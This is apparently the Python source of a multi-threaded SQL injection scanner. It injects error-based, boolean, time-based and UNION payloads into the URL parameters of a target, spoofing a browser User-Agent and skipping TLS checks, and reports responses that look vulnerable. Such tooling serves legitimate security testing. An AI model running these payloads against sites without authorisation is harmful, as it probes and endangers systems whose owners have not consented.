"""
SQL Injection Scanner Engine
Multi-threaded scanning with requests library
"""

import json
import time
import urllib.parse
from typing import Dict, List, Optional, Callable
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import requests
from requests.adapters import HTTPAdapter

from detector import SQLiDetector, DetectionResult


class SimpleRetry:
    """Simple retry strategy without urllib3 dependency"""
    def __init__(self, total: int = 3, backoff_factor: float = 0.5):
        self.total = total
        self.backoff_factor = backoff_factor

@dataclass
class ScanResult:
    """Result of a single injection test"""
    url: str
    parameter: str
    payload: str
    payload_type: str
    vulnerable: bool
    confidence: int
    db_type: str
    error_type: str
    evidence: str
    response_code: int
    response_time: float
    response_length: int

@dataclass
class ScanProgress:
    """Track scan progress"""
    total_payloads: int = 0
    tested_payloads: int = 0
    vulnerabilities_found: int = 0
    current_url: str = ""
    current_parameter: str = ""
    current_payload: str = ""
    start_time: float = field(default_factory=time.time)
    
    @property
    def elapsed_time(self) -> float:
        return time.time() - self.start_time
    
    @property
    def progress_percent(self) -> float:
        if self.total_payloads == 0:
            return 0
        return (self.tested_payloads / self.total_payloads) * 100
    
    @property
    def requests_per_second(self) -> float:
        if self.elapsed_time == 0:
            return 0
        return self.tested_payloads / self.elapsed_time


class SQLiScanner:
    """Multi-threaded SQL Injection Scanner"""
    
    DEFAULT_HEADERS = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    }
    
    def __init__(
        self,
        payloads_file: str = "payloads.json",
        threads: int = 10,
        timeout: int = 10,
        delay: float = 0,
        verbose: bool = False,
        progress_callback: Optional[Callable[[ScanProgress], None]] = None
    ):
        self.threads = threads
        self.timeout = timeout
        self.delay = delay
        self.verbose = verbose
        self.progress_callback = progress_callback
        
        self.detector = SQLiDetector()
        self.payloads = self._load_payloads(payloads_file)
        self.results: List[ScanResult] = []
        self.progress = ScanProgress()
        self._lock = threading.Lock()
        self._stop_event = threading.Event()
        
        self.session = self._create_session()
    
    def _create_session(self) -> requests.Session:
        """Create a requests session with connection pooling"""
        session = requests.Session()
        adapter = HTTPAdapter(
            max_retries=3,
            pool_connections=self.threads,
            pool_maxsize=self.threads * 2
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        session.headers.update(self.DEFAULT_HEADERS)
        return session
    
    def _load_payloads(self, payloads_file: str) -> Dict[str, List[str]]:
        """Load SQL injection payloads from JSON file"""
        try:
            with open(payloads_file, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            print(f"[!] Payloads file not found: {payloads_file}")
            return self._get_default_payloads()
        except json.JSONDecodeError as e:
            print(f"[!] Error parsing payloads JSON: {e}")
            return self._get_default_payloads()
    
    def _get_default_payloads(self) -> Dict[str, List[str]]:
        """Fallback minimal payload set"""
        return {
            "error_based": ["'", "\"", "' OR '1'='1", "' OR 1=1--"],
            "boolean_based": ["' AND 1=1--", "' AND 1=2--"],
            "time_based": ["' OR SLEEP(5)#", "'; WAITFOR DELAY '0:0:5'--"],
            "union_based": ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--"],
        }
    
    def _extract_parameters(self, url: str) -> Dict[str, str]:
        """Extract query parameters from URL"""
        parsed = urllib.parse.urlparse(url)
        return dict(urllib.parse.parse_qsl(parsed.query))
    
    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        params[param] = payload
        new_query = urllib.parse.urlencode(params)
        return urllib.parse.urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))
    
    def _get_baseline(self, url: str) -> Optional[str]:
        """Get baseline response for comparison"""
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            return response.text
        except Exception:
            return None
    
    def _test_payload(
        self,
        url: str,
        param: str,
        payload: str,
        payload_type: str,
        baseline: Optional[str] = None
    ) -> Optional[ScanResult]:
        """Test a single payload against a parameter"""
        if self._stop_event.is_set():
            return None
        
        injected_url = self._inject_payload(url, param, payload)
        
        try:
            start_time = time.time()
            response = self.session.get(
                injected_url,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )
            response_time = time.time() - start_time
            
            detection = self.detector.detect(response.text, baseline)
            
            if payload_type == "time_based" and response_time > 4.5:
                detection = DetectionResult(
                    vulnerable=True,
                    confidence=85,
                    db_type=detection.db_type if detection.db_type != "unknown" else "unknown",
                    error_type="time_based",
                    matched_pattern="response_delay",
                    evidence=f"Response delayed by {response_time:.2f}s"
                )
            
            with self._lock:
                self.progress.tested_payloads += 1
                self.progress.current_url = url
                self.progress.current_parameter = param
                self.progress.current_payload = payload[:50]
                
                if self.progress_callback:
                    self.progress_callback(self.progress)
            
            if self.delay > 0:
                time.sleep(self.delay)
            
            if detection.vulnerable:
                with self._lock:
                    self.progress.vulnerabilities_found += 1
                
                result = ScanResult(
                    url=url,
                    parameter=param,
                    payload=payload,
                    payload_type=payload_type,
                    vulnerable=True,
                    confidence=detection.confidence,
                    db_type=detection.db_type,
                    error_type=detection.error_type,
                    evidence=detection.evidence,
                    response_code=response.status_code,
                    response_time=response_time,
                    response_length=len(response.text)
                )
                
                if self.verbose:
                    print(f"\n[+] VULNERABLE: {url}")
                    print(f"    Parameter: {param}")
                    print(f"    Payload: {payload}")
                    print(f"    Type: {payload_type}")
                    print(f"    Confidence: {detection.confidence}%")
                    print(f"    Database: {detection.db_type}")
                    print(f"    Evidence: {detection.evidence[:100]}")
                
                return result
            
            return None
            
        except requests.Timeout:
            if payload_type == "time_based":
                with self._lock:
                    self.progress.vulnerabilities_found += 1
                    self.progress.tested_payloads += 1
                
                return ScanResult(
                    url=url,
                    parameter=param,
                    payload=payload,
                    payload_type=payload_type,
                    vulnerable=True,
                    confidence=75,
                    db_type="unknown",
                    error_type="time_based_timeout",
                    evidence=f"Request timed out after {self.timeout}s (indicates time-based SQLi)",
                    response_code=0,
                    response_time=self.timeout,
                    response_length=0
                )
            with self._lock:
                self.progress.tested_payloads += 1
            return None
            
        except Exception as e:
            if self.verbose:
                print(f"[-] Error testing {param}: {str(e)[:50]}")
            with self._lock:
                self.progress.tested_payloads += 1
            return None
    
    def scan(self, url: str, payload_types: Optional[List[str]] = None) -> List[ScanResult]:
        """
        Scan URL for SQL injection vulnerabilities
        
        Args:
            url: Target URL with parameters to test
            payload_types: List of payload types to use (default: all)
        
        Returns:
            List of ScanResult for found vulnerabilities
        """
        self.results = []
        self._stop_event.clear()
        
        params = self._extract_parameters(url)
        if not params:
            base_url = url if '?' in url else url + '?'
            test_params = ["id", "page", "cat", "item", "user", "search", "q"]
            params = {p: "1" for p in test_params}
            url = base_url + "&".join([f"{k}={v}" for k, v in params.items()])
        
        if payload_types is None:
            payload_types = list(self.payloads.keys())
        
        all_payloads = []
        for ptype in payload_types:
            if ptype in self.payloads:
                for payload in self.payloads[ptype]:
                    all_payloads.append((ptype, payload))
        
        total_tests = len(params) * len(all_payloads)
        self.progress = ScanProgress(total_payloads=total_tests)
        
        print(f"\n[*] Starting SQL Injection Scan")
        print(f"[*] Target: {url}")
        print(f"[*] Parameters: {list(params.keys())}")
        print(f"[*] Payload types: {payload_types}")
        print(f"[*] Total tests: {total_tests}")
        print(f"[*] Threads: {self.threads}")
        print("-" * 60)
        
        baseline = self._get_baseline(url)
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for param in params:
                for payload_type, payload in all_payloads:
                    future = executor.submit(
                        self._test_payload,
                        url,
                        param,
                        payload,
                        payload_type,
                        baseline
                    )
                    futures.append(future)
            
            for future in as_completed(futures):
                if self._stop_event.is_set():
                    break
                    
                result = future.result()
                if result:
                    self.results.append(result)
                
                if not self.verbose:
                    progress = self.progress.progress_percent
                    rps = self.progress.requests_per_second
                    vulns = self.progress.vulnerabilities_found
                    print(f"\r[*] Progress: {progress:.1f}% | RPS: {rps:.1f} | Vulnerabilities: {vulns}", end="", flush=True)
        
        print(f"\n\n[*] Scan Complete!")
        print(f"[*] Total requests: {self.progress.tested_payloads}")
        print(f"[*] Time elapsed: {self.progress.elapsed_time:.2f}s")
        print(f"[*] Vulnerabilities found: {len(self.results)}")
        
        return self.results
    
    def stop(self) -> None:
        """Stop the scan gracefully"""
        self._stop_event.set()
    
    def get_unique_vulnerabilities(self) -> List[ScanResult]:
        """Get unique vulnerabilities (deduplicated by parameter)"""
        seen = set()
        unique = []
        for result in self.results:
            key = (result.url, result.parameter, result.db_type)
            if key not in seen:
                seen.add(key)
                unique.append(result)
        return unique
